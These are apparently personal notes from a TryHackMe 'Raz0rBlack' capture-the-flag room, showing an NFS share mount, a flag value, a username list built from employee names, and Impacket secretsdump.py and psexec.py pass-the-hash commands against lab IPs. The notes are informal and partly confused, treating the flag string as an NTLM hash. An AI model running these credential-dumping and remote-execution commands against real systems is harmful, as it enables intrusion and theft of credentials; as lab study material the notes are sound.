I don't know but my initution was telling that if there is share folder than it should connect i might be doing something wrong and yes i was.

Finally the command worked haahahahahahha and got something
https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting

```
mount -t nfs -o vers=3 10.10.56.159:users . -o nolock
```

![[Pasted image 20230919151501.png]]

```
┌──(root㉿kali)-[~/TryHackMe/Raz0rBlack]
└─# cat sbradley.txt                
��THM{ab53e05c9a98def00314a14ccbfa8104}

```

![[Pasted image 20230919160317.png]]
file : employrr_status.xlxs
![[Pasted image 20230919160432.png]]

We have to do now try rpc dump or rpc client or could even do secretmapexec or crackmapexec 

```
User: steven_bradley
Hash: ab53e05c9a98def00314a14ccbfa8104
```
**As u can see that the employee name is 
steven bradley but the file name was sbradley so will make a modified user list like this**

10.10.245.107
Name:                  Role
carl ingram 	       CTF player inactive
chamber lin		CTF player inactive
Steven bradley         STEGO SPECIALIST
ljudmuka vetrova       CTF PLAYER DEVELOPER ACTIVE DIRECTORY ADMIN

```
Modified User list
cingram 	     
clin		
sbradley       
lvetrova       
```


User: steven_bradley
Hash: ab53e05c9a98def00314a14ccbfa8104

rpcclient -U "steven_bradle" -N 10.10.160.250
NTLM 1000


secretsdump.py raz0rblack/steven_bradley:ab53e05c9a98def00314a14ccbfa8104@10.10.245.107

psexec.py "steven_bradley":@10.10.245.107 -hashes ab53e05c9a98def00314a14ccbfa8104
